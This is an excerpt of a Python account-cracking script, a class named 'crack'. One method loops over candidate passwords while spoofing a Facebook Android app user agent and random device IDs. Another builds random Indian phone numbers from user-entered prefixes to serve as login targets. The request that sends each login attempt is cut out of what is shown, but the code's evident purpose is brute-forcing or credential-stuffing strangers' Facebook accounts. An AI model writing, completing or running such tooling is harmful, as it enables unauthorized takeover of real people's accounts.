...
class crack:
    ...
    def __mmb__(self,user,__juts__,_jat):
        ...
        for pw in __juts__:
            try:
                ...
                ua_string4 = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=3.0,width=1080,height=2040};FBLC/en_US;FBRV/0;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/BKL-L09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
                device = str(uuid.uuid4())
                adid = str(uuid.uuid4())
                data = {
                    'adid':adid,
    ...
    def __random__(self):
        ...
        if tg == '1':
            ...
            os.system('clear')
            print (logo4)
            print ('\033[1;33mEnter Code 4 Digit indian Code\033[0;97m')
            print (47*'-')
            print ('\033[1;33mExample 7669,9418,981,962,809,745,etc.\033[0;97m')
            print (47*'-')
            os.system('rm -rf .num.txt')
            k = '91'
